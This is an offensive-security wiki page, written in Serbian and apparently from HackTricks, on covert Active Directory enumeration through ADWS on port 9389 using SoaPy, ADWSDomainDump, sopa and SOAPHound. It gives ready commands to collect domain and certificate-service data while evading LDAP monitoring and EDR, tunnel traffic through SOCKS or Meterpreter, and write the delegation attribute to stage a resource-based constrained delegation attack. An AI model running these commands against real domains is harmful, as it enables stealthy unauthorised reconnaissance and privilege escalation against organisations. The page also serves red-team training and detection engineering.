# Enumeracija Active Directory Web Services (ADWS) i prikriveno prikupljanje

{{#include ../../banners/hacktricks-training.md}}

## Šta je ADWS?

Active Directory Web Services (ADWS) je **podrazumevano omogućen na svakom Domain Controller-u od Windows Server 2008 R2** i osluškuje na TCP **9389**. Uprkos imenu, **HTTP nije uključen**. Umesto toga, servis izlaže LDAP-stil podatke kroz sloj proprietarnih .NET framing protokola:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Pošto je saobraćaj enkapsuliran unutar ovih binarnih SOAP frejmova i putuje preko neuobičajenog porta, **enumeracija preko ADWS-a je znatno manje verovatno da će biti inspektovana, filtrirana ili signature-ovana u poređenju sa klasičnim LDAP/389 & 636 saobraćajem**. Za operatore to znači:

* Diskretniji izviđaj — Blue timovi često se koncentrišu na LDAP upite.
* Mogućnost prikupljanja sa **non-Windows hostova (Linux, macOS)** tunelovanjem 9389/TCP kroz SOCKS proxy.
* Isti podaci koje biste dobili putem LDAP-a (users, groups, ACLs, schema, itd.) i mogućnost izvođenja **write** operacija (npr. `msDs-AllowedToActOnBehalfOfOtherIdentity` za **RBCD**).

Interakcije sa ADWS-om su implementirane preko WS-Enumeration: svaki upit počinje sa `Enumerate` porukom koja definiše LDAP filter/atribute i vraća `EnumerationContext` GUID, nakon čega slede jedna ili više `Pull` poruka koje strimuju rezultate do server-definisanog prozora. Context-i ističu nakon ~30 minuta, tako da alati moraju either straničiti rezultate ili podeliti filtere (prefix upiti po CN) da bi izbegli gubitak stanja. Kada tražite security descriptor-e, navedite `LDAP_SERVER_SD_FLAGS_OID` kontrolu da izostavite SACL-ove, inače ADWS jednostavno uklanja atribut `nTSecurityDescriptor` iz svog SOAP odgovora.

> NAPOMENA: ADWS se takođe koristi od strane mnogih RSAT GUI/PowerShell alata, pa saobraćaj može da se uklopi sa legitimnim administratorskim aktivnostima.

## SoaPy – Nativni Python klijent

[SoaPy](https://github.com/logangoins/soapy) je **potpuna reimplementacija ADWS protokol stack-a u čistom Python-u**. On kreira NBFX/NBFSE/NNS/NMF frejmove byte-for-byte, omogućavajući prikupljanje sa Unix-like sistema bez korišćenja .NET runtime-a.

### Ključne osobine

* Podržava **proxy preko SOCKS** (korisno iz C2 implantata).
* Fino-granularni search filteri identični LDAP `-q '(objectClass=user)'`.
* Opcionalne **write** operacije ( `--set` / `--delete` ).
* **BOFHound output mode** za direktan unos u BloodHound.
* `--parse` flag za formatiranje timestamps / `userAccountControl` kada je potrebna čitljivost za ljude.

### Ciljani prekidači za prikupljanje i operacije pisanja

SoaPy dolazi sa kuriranim switch-evima koji repliciraju najčešće LDAP hunting zadatke preko ADWS-a: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` opcije za prilagođene pull-ove. Povežite ih sa write primitivima kao što su `--rbcd <source>` (postavlja `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging za ciljani Kerberoasting) i `--asrep` (promena `DONT_REQ_PREAUTH` u `userAccountControl`).

Primer ciljane SPN pretrage koja vraća samo `samAccountName` i `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Koristite isti host/credentials da odmah weaponise findings: dump RBCD-capable objects pomoću `--rbcds`, zatim primenite `--rbcd 'WEBSRV01$' --account 'FILE01$'` kako biste stage-ovali Resource-Based Constrained Delegation chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) for the full abuse path).

### Instalacija (host operatera)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Fork `ldapdomaindump` koji zamenjuje LDAP upite ADWS pozivima na TCP/9389 kako bi smanjio LDAP-signature hits.
* Izvodi početnu proveru dostupnosti na portu 9389 osim ako nije prosleđen `--force` (preskače sondiranje ako su port scanovi bučni/filtrirani).
* Testirano protiv Microsoft Defender for Endpoint i CrowdStrike Falcon; uspešan bypass je opisan u README.

### Instalacija
```bash
pipx install .
```
### Upotreba
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipični izlaz beleži proveru dostupnosti porta 9389, ADWS bind, i dump start/finish:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Praktičan klijent za ADWS u Golang

Slično kao soapy, [sopa](https://github.com/Macmod/sopa) implementira ADWS protokolni sloj (MS-NNS + MC-NMF + SOAP) u Golang, izlažući komandne opcije za slanje ADWS poziva kao što su:

* **Pretraga i dohvat objekata** - `query` / `get`
* **Životni ciklus objekta** - `create [user|computer|group|ou|container|custom]` i `delete`
* **Izmena atributa** - `attr [add|replace|delete]`
* **Upravljanje nalozima** - `set-password` / `change-password`
* i drugi kao što su `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, itd.

## SOAPHound – Sakupljanje velike količine podataka iz ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) je .NET sakupljač koji zadržava sve LDAP interakcije unutar ADWS i emituje BloodHound v4-kompatibilan JSON. Pravi kompletnu keš kopiju `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` jednom (`--buildcache`), a zatim je ponovo koristi za visokopropusne `--bhdump`, `--certdump` (ADCS) ili `--dnsdump` (AD-integrated DNS) prolaze, tako da iz DC-a izlazi samo ~35 kritičnih atributa. AutoSplit (`--autosplit --threshold <N>`) automatski razdvaja upite po CN prefiksu kako bi ostao ispod 30-minutnog EnumerationContext timeout-a u velikim forest-ovima.

Tipičan radni tok na operator VM-u povezanom sa domenom:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Izvezeni JSON slotovi direktno u SharpHound/BloodHound workflows—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit čini SOAPHound otpornim na šume sa više miliona objekata, a pritom održava broj upita nižim nego kod ADExplorer-style snapshots.

## Tok rada za neprimetno prikupljanje AD podataka

Sledeći tok rada pokazuje kako da enumerišete **domen & ADCS objekte** preko ADWS, konvertujete ih u BloodHound JSON i tražite putanje napada zasnovane na sertifikatima – sve sa Linuxa:

1. **Tunelujte 9389/TCP** iz ciljne mreže na vašu mašinu (npr. preko Chisel, Meterpreter, SSH dynamic port-forward, itd.). Postavite `export HTTPS_PROXY=socks5://127.0.0.1:1080` ili koristite SoaPy’s `--proxyHost/--proxyPort`.

2. **Prikupite korenski objekat domena:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Sakupite ADCS-povezane objekte iz Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konvertuj u BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Upload the ZIP** u BloodHound GUI i pokrenite cypher upite kao što su `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` da otkrijete puteve eskalacije sertifikata (ESC1, ESC8, itd.).

### Pisanje `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombinujte ovo sa `s4u2proxy`/`Rubeus /getticket` za potpun **Resource-Based Constrained Delegation** lanac (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Pregled alata

| Svrha | Alat | Napomene |
|---------|------|-------|
| ADWS enumeracija | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| ADWS dump velikog obima | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| Učitavanje u BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Konvertuje SoaPy/ldapsearch logs |
| Kompromitacija certifikata | [Certipy](https://github.com/ly4k/Certipy) | Može se proxirati kroz isti SOCKS |
| ADWS enumeracija i izmene objekata | [sopa](https://github.com/Macmod/sopa) | Generički klijent za interakciju sa poznatim ADWS endpoints - omogućava enumeraciju, kreiranje objekata, modifikacije atributa i promene lozinki |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
